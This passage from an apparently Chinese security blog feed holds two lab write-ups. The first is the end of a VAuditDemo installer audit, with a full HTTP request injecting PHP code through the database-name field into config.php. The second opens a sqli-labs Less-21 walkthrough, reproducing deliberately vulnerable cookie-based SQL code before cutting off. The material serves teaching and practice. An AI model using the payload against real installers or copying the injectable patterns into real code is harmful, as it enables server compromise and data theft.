/install/install.php\&quot;);\r\nexit;\r\n&#125;\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;include_once(&apos;../sys/lib.php&apos;);\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\$host=\&quot;$dbhost\&quot;; \r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\$username=\&quot;$dbuser\&quot;; \r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\$password=\&quot;$dbpass\&quot;; \r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\$database=\&quot;$dbname\&quot;; \r\n&quot;; /*这里就是关键2*/</span><br><span class="line">$str_tmp.=&quot;\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\$conn = mysql_connect(\$host,\$username,\$password);\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;mysql_query(&apos;set names utf8&apos;,\$conn);\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;mysql_select_db(\$database, \$conn) or die(mysql_error());\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;if (!\$conn)\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;&#123;\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\tdie(&apos;Could not connect: &apos; . mysql_error());\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\texit;\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;&#125;\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;session_start();\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\r\n&quot;;</span><br><span class="line">$str_tmp.=$str_end;</span><br><span class="line"></span><br><span class="line">$fp=fopen( &quot;../sys/config.php&quot;, &quot;w&quot; ); /*写入了config.php*/</span><br><span class="line">fwrite( $fp, $str_tmp );</span><br><span class="line">fclose( $fp );</span><br><span class="line"></span><br><span class="line">//创建表</span><br><span class="line">mysql_select_db( $dbname, $con );</span><br><span class="line">mysql_query( &quot;set names &apos;utf8&apos;&quot;, $con );</span><br><span class="line">//导入数据库</span><br><span class="line">$sql=file_get_contents( &quot;install.sql&quot; );</span><br><span class="line">$a=explode( &quot;;&quot;, $sql );</span><br><span class="line">foreach ( $a as $b ) &#123;</span><br><span class="line">mysql_query( $b.&quot;;&quot; );</span><br><span class="line">&#125;</span><br><span class="line">mysql_close( $con );</span><br><span class="line">file_put_contents($_SERVER[&quot;DOCUMENT_ROOT&quot;].&apos;/sys/install.lock&apos;, &apos;virink&apos;);</span><br><span class="line">echo &quot;&lt;script&gt;if(!alert(&apos;安裝成功&apos;))&#123;window.location.href=&apos;../index.php&apos;;&#125;&lt;/script&gt;&quot;;</span><br><span class="line">exit;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">echo &quot;&lt;form id=&apos;form1&apos; name=&apos;form1&apos; method=&apos;post&apos; action=&apos;&apos;&gt;&quot;;</span><br><span class="line">echo &quot;&lt;table width=&apos;100%&apos; border=&apos;0&apos; align=&apos;center&apos; cellpadding=&apos;10&apos; id=&apos;table&apos;&gt;&quot;;</span><br><span class="line">echo &quot;&lt;tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;td colspan=&apos;2&apos;&gt;&lt;h1&gt;&lt;/h1&gt;&lt;/td&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;td&gt;&lt;div align=&apos;right&apos;&gt;數據庫连接地址：&lt;/div&gt;&lt;/td&gt;&quot;;</span><br><span class="line">echo &quot;&lt;td&gt;&lt;input name=&apos;dbhost&apos; type=&apos;text&apos; id=&apos;input&apos; value=&apos;localhost&apos;/&gt; *&lt;/td&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;td&gt;&lt;div align=&apos;right&apos;&gt;數據庫登錄名：&lt;/div&gt;&lt;/td&gt;&quot;;</span><br><span class="line">echo &quot;&lt;td&gt;&lt;input name=&apos;dbuser&apos; type=&apos;text&apos; id=&apos;input&apos; value=&apos;root&apos;/&gt; *&lt;/td&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;td&gt;&lt;div align=&apos;right&apos;&gt;數據庫登錄密碼：&lt;/div&gt;&lt;/td&gt;&quot;;</span><br><span class="line">echo &quot;&lt;td&gt;&lt;input name=&apos;dbpass&apos; type=&apos;password&apos; id=&apos;input&apos; value=&apos;root&apos;/&gt; *&lt;/td&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;td&gt;&lt;div align=&apos;right&apos;&gt;創建數據庫名稱：&lt;/div&gt;&lt;/td&gt;&quot;;</span><br><span class="line">echo &quot;&lt;td&gt;&lt;input name=&apos;dbname&apos; type=&apos;text&apos; id=&apos;input&apos; value=&apos;vauditdemo&apos;/&gt; *&lt;/td&gt; &quot;;</span><br><span class="line">echo &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;td&gt;&lt;/td&gt;&quot;;</span><br><span class="line">echo &quot;&lt;td&gt;&lt;input type=&apos;submit&apos; class=&apos;btn&apos; name=&apos;Submit&apos; value=&apos;安裝&apos; /&gt;&lt;/td&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/table&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/form&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>然后在看config.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!file_exists($_SERVER[&quot;DOCUMENT_ROOT&quot;] . &apos;/sys/install.lock&apos;)) &#123;</span><br><span class="line">header(&quot;Location: /install/install.php&quot;);</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include_once &apos;../sys/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">$host = &quot;localhost&quot;;</span><br><span class="line">$username = &quot;root&quot;;</span><br><span class="line">$password = &quot;root&quot;;</span><br><span class="line">$database = &quot;vauditdemo&quot;; /*由于install.php写入到config.php,可以构造一个这样的payload,exp;-- -&quot;;phpinfo();既能保证mysql的正常查询也能插入payload*/</span><br><span class="line"></span><br><span class="line">$conn = mysql_connect($host, $username, $password);</span><br><span class="line">mysql_query(&apos;set names utf8&apos;, $conn);</span><br><span class="line">mysql_select_db($database, $conn) or die(mysql_error());</span><br><span class="line">if (!$conn) &#123;</span><br><span class="line">die(&apos;Could not connect: &apos; . mysql_error());</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>payload数据包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /install/install.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 97</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/VAuditDemo-master/VAuditDemo_Debug/install/install.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie: PHPSESSID=cob9q8vcbat4tm3a5f8nqoa2p1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">dbhost=localhost&amp;dbuser=root&amp;dbpass=root&amp;dbname=&quot;nmgcb;-- -&quot;;phpinfo();//&amp;Submit=%E5%AE%89%E8%A3%9D</span><br></pre></td></tr></table></figure></p><p>结果：<br><img src="https://s2.ax1x.com/2019/01/20/kPM3gH.png" alt="kPM3gH.png"></p><p><img src="https://s2.ax1x.com/2019/01/20/kPQnMj.png" alt="kPQnMj.png"></p><h2 id="小实验"><a href="#小实验" class="headerlink" title="小实验"></a>小实验</h2><p>一开始，我在跳转那里发懵了半天。后面自己demo了一下懂了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(file_exists(&apos;haq520.txt&apos;))&#123;</span><br><span class="line">    header(&quot;Location: ../demo3.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$username=$_GET[&apos;u&apos;];</span><br><span class="line">$fk=fopen(&quot;haq520.txt&quot;,&quot;a&quot;);</span><br><span class="line">$txt=$username;</span><br><span class="line">fwrite($fk,$txt);</span><br><span class="line">fclose($fk);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>然后请求为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/demo7.php?u=此生不是你，终身不娶</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/20/kPQGJU.png" alt="kPQGJU.png"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>有些不懂的地方多多实验或者写个差不多的例子可以明白的快一点</p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs-Less-21 - sqli-labs-Less-24</title>
      <link href="/posts/ce004298.html"/>
      <url>/posts/ce004298.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>秉承着要通过sqli-labs练习平台，然后今天继续刷关。再次做个记录<br><img src="http://5b0988e595225.cdn.sohucs.com/images/20180620/7153ff51dc83498e925e5c5a84885ba8.jpeg" alt="7153ff51dc83498e925e5c5a84885ba8.jpeg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>sqli-labs第二十一关：<br>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;Less-21 Cookie Injection- Error Based- complex - string&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line">if(!isset($_COOKIE[&apos;uname&apos;])) /*如果不存在cookie*/</span><br><span class="line">&#123;</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;div style=&apos; margin-top:20px;color:#FFF; font-size:24px; text-align:center&apos;&gt; Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&apos;#FF0000&apos;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;&quot;;</span><br><span class="line">echo &quot;&lt;div  align=&apos;center&apos; style=&apos;margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;&apos;&gt;&quot;;</span><br><span class="line">echo &quot;&lt;div style=&apos;padding-top:10px; font-size:15px;&apos;&gt;&quot;;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">echo &quot;&lt;!--Form to post the contents --&gt;&quot;;</span><br><span class="line">echo &apos;&lt;form action=&quot; &quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;&apos;;</span><br><span class="line"></span><br><span class="line">echo &apos; &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;&apos;;</span><br><span class="line">echo &apos;   &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;  &lt;/div&gt;&apos;;</span><br><span class="line">  </span><br><span class="line">echo &apos; &lt;div&gt; Password : &amp;nbsp; &amp;nbsp; &amp;nbsp;&apos;;</span><br><span class="line">echo &apos;   &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;&lt;/div&gt;&lt;/br&gt;&apos;;</span><br><span class="line">echo &apos;   &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;&apos;;</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;/form&gt;&apos;;</span><br><span class="line">echo &apos;&lt;/div&gt;&apos;;</span><br><span class="line">echo &apos;&lt;/div&gt;&apos;;</span><br><span class="line">echo &apos;&lt;div style=&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;&gt;&apos;;</span><br><span class="line">echo &apos;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">echo &apos;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">echo &apos;&lt;img src=&quot;../images/Less-21.jpg&quot; /&gt;&apos;;</span><br><span class="line">echo &apos;&lt;/center&gt;&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function check_input($value)</span><br><span class="line">&#123;</span><br><span class="line">if(!empty($value)) /*判断$value不为空*/</span><br><span class="line">&#123;</span><br><span class="line">$value = substr($value,0,20); // truncation (see comments) /*从0的位置开始取值，长度为20*/</span><br><span class="line">&#125;</span><br><span class="line">if (get_magic_quotes_gpc())  // Stripslashes if magic quotes enabled /*开启get_magic_quotes_gpc()*/</span><br><span class="line">&#123;</span><br><span class="line">$value = stripslashes($value);</span><br><span class="line">&#125;</span><br><span class="line">if (!ctype_digit($value))   // Quote if not a number /*判断是否为纯数字*/</span><br><span class="line">&#123;</span><br><span class="line">$value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$value = intval($value); /*取整数类型*/</span><br><span class="line">&#125;</span><br><span class="line">return $value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) /*判断uname和passwd是否为空*/</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">$uname = check_input($_POST[&apos;uname&apos;]); /*过滤操作*/</span><br><span class="line">$passwd = check_input($_POST[&apos;passwd&apos;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">$result1 = mysql_query($sql);</span><br><span class="line">$row1 = mysql_fetch_array($result1);</span><br><span class="line">if($row1)</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;;</span><br><span class="line">setcookie(&apos;uname&apos;, base64_encode($row1[&apos;username&apos;]), time()+3600);</span><br><span class="line"></span><br><span class="line">echo &quot;I LOVE YOU COOKIES&quot;;</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">echo &apos;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&apos;;</span><br><span class="line">//echo &apos;Your Cookie is: &apos; .$cookee;</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&apos;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">header (&apos;Location: index.php&apos;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;;</span><br><span class="line">//echo &quot;Try again looser&quot;;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&apos;;</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">echo &apos;&lt;/font&gt;&apos;;</span><br><span class="line">echo &apos;&lt;/div&gt;&apos;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!isset($_POST[&apos;submit&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$cookee = $_COOKIE[&apos;uname&apos;];</span><br><span class="line">$format = &apos;D d M Y - H:i:s&apos;;</span><br><span class="line">$timestamp = time() + 3600;</span><br><span class="line">echo &quot;&lt;center&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;;</span><br><span class="line">echo &apos;&lt;img src=&quot;../images/Less-21.jpg&quot; /&gt;&apos;;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;;</span><br><span class="line">echo &apos;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;&apos;;</span><br><span class="line">echo &quot;YOUR USER AGENT IS : &quot;.$_SERVER[&apos;HTTP_USER_AGENT&apos;];</span><br><span class="line">echo &quot;&lt;/font&gt;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;&apos;;</span><br><span class="line">echo &quot;YOUR IP ADDRESS IS : &quot;.$_SERVER[&apos;REMOTE_ADDR&apos;];</span><br><span class="line">echo &quot;&lt;/font&gt;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;&apos;;</span><br><span class="line">echo &quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;font color= &quot;orange&quot; font size = 5 &gt;&apos;;</span><br><span class="line">echo &quot;YOUR COOKIE : uname = $cookee and expires: &quot; . date($format, $timestamp);</span><br><span class="line"></span><br><span class="line">$cookee = base64_decode($cookee);</span><br><span class="line">echo &quot;&lt;br&gt;&lt;/font&gt;&quot;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE username=(&apos;$cookee&apos;) LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">if (!$result)</span><br><span class="line">  &#123;</span><br><span class="line">  die(&apos;Issue with your mysql: &apos; . mysql_error());</span><br><span class="line">  &#125;</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &apos;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&apos;;</span><br><span class="line">  echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&apos;;  </span><br><span class="line">echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">  echo &quot;&lt;/font&gt;&lt;/b&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;Your ID:&apos; .$row[&apos;id&apos;];</span><br><span class="line">  &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;center&gt;&quot;;</span><br><span class="line">echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">echo &apos;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&apos;;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;;</span><br><span class="line">//echo &apos;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">echo &apos;&lt;center&gt;&apos;;</span><br><span class="line">echo &apos;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&apos;;</span><br><span class="line">echo &apos;&lt;input  type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Delete Your Cookie!&quot; /&gt;&apos;;</span><br><span class="line">echo &apos;&lt;/form&gt;&apos;;</span><br><span class="line">echo &apos;&lt;/center&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;center&gt;&apos;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 6 &gt;&apos;;</span><br><span class="line">echo &quot; Your Cookie is deleted&quot;;</span><br><span class="line">setcookie(&apos;uname&apos;, base64_encode($row1[&apos;username&apos;]), time()-3600);</span><br><span class="line">header (&apos;Location: index.php&apos;);</span><br><span class="line">echo &apos;&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;&apos;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">//header (&apos;Location: main.php&apos;);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">//echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&lt;/center&gt;&apos;;</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span 